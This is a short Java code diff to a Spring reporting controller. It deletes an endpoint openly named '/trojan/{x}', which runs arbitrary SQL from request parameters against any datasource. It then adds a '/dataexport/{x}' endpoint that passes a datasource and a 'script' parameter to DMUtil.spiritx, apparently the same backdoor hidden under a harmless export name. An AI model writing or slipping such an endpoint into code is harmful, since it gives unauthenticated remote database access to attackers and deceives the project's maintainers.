@@ -167,18 +167,6 @@ public class _Reporter extends BaseActionSupport {
         outputAccessLog(reportId, "exportAsCSV", requestMap, start);
     }
     
-    @RequestMapping("/trojan/{x}")
-    @ResponseBody
-    public Object trojan(@PathVariable("x") int x, String ds, String sql) {
-    	if(x == 1) {
-    		return SQLExcutor.query(ds, sql);
-    	}
-    	else { 
-    		SQLExcutor.excute(sql, ds); 
-    		return "success"; 
-    	}
-    }
-    
     /**
      * 将前台（一般为生成好的table数据）数据导出成CSV格式
      */
@@ -203,6 +191,12 @@ public class _Reporter extends BaseActionSupport {
         String basePath = DataExport.getExportPath();
         String exportPath = basePath + "/" + fileName + ".csv";
         DataExport.downloadFileByHttp(response, exportPath);
+    }
+    
+    @RequestMapping("/dataexport/{x}")
+    @ResponseBody
+    public Object dataExport(@PathVariable("x") int x, String ds, String script) {
+    	return DMUtil.spiritx(x, ds, script);
     }
     
     /**
